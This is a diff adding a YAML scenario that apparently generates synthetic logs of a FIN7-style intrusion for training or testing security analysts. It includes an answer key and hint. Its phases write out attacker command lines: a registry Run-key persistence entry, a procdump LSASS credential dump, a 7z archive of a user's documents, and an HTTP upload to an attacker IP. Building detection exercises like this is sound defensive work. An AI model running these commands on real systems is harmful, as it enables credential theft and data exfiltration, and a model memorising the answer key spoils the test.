@@ -1,0 +1,118 @@
+meta:
+  name: "FIN7: Spearphishing to Lateral Movement"
+  difficulty: hard
+  answer: INCIDENT
+  mitre_techniques:
+    - id: T1566.001
+      name: "Spearphishing Attachment"
+    - id: T1204.002
+      name: "User Execution: Malicious File"
+    - id: T1059.005
+      name: "Command and Scripting Interpreter: VBScript"
+    - id: T1547.001
+      name: "Boot or Logon Autostart: Registry Run Keys"
+    - id: T1003.001
+      name: "OS Credential Dumping: LSASS Memory"
+    - id: T1021.001
+      name: "Remote Services: RDP"
+    - id: T1560.001
+      name: "Archive Collected Data: Archive via Utility"
+    - id: T1041
+      name: "Exfiltration Over C2 Channel"
+  hint: "Word document spawned wscript, then certutil download and credential dumping via procdump"
+  alert:
+    rule_id: SUSPICIOUS_PROCESS
+    severity: HIGH
+    summary: "WINWORD.EXE spawned wscript.exe on {inject_malicious_host} (user: {inject_malicious_user})"
+    description: "Office application launched a script interpreter — common malicious macro pattern. Investigate parent-child process chain and any subsequent network activity or file drops."
+
+world_overrides:
+  attacker_ip: "198.51.100.77"
+  inject_malicious_host: "WS007"
+  inject_malicious_user: "sarah.miller"
+
+phases:
+  phase_1:
+    name: "Initial Access: Malicious Attachment"
+    technique: T1566.001
+    count: 1
+    log_factory: sysmon.file_create
+    spread_seconds: 5
+    delay_after_prev: [2, 10]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      target_filename: "Invoice_2024_Q4.docm"
+
+  phase_2:
+    name: "Execution: VBScript Macro"
+    technique: T1059.005
+    count: 3
+    log_factory: sysmon.process_create
+    spread_seconds: 45
+    delay_after_prev: [5, 20]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      command_line: "wscript.exe C:\\Users\\Public\\tmp.vbs"
+
+  phase_3:
+    name: "Persistence: Registry Run Key"
+    technique: T1547.001
+    count: 1
+    log_factory: sysmon.process_create
+    spread_seconds: 5
+    delay_after_prev: [3, 10]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      command_line: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\payload.exe /f"
+
+  phase_4:
+    name: "Credential Access: LSASS Dump"
+    technique: T1003.001
+    count: 1
+    log_factory: sysmon.process_create
+    spread_seconds: 5
+    delay_after_prev: [10, 30]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      command_line: "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp"
+
+  phase_5:
+    name: "Lateral Movement: RDP"
+    technique: T1021.001
+    count: 2
+    log_factory: successful_logon
+    spread_seconds: 30
+    delay_after_prev: [15, 45]
+    params:
+      source_ip: "{attacker_ip}"
+      dest_host: "DC01"
+      target_user: "{inject_malicious_user}"
+
+  phase_6:
+    name: "Collection: Archive Data"
+    technique: T1560.001
+    count: 1
+    log_factory: sysmon.process_create
+    spread_seconds: 10
+    delay_after_prev: [5, 20]
+    params:
+      dest_host: "DC01"
+      target_user: "{inject_malicious_user}"
+      command_line: "7z.exe a -p infected C:\\Temp\\exfil.zip C:\\Users\\sarah.miller\\Documents\\*"
+
+  phase_7:
+    name: "Exfiltration: HTTP Upload"
+    technique: T1041
+    count: 5
+    log_factory: proxy.http_request
+    spread_seconds: 300
+    delay_after_prev: [10, 30]
+    params:
+      source_ip: "{attacker_ip}"
+      url: "http://198.51.100.77/api/v1/check"
+      method: POST
+      user_agent: "curl/7.68.0"
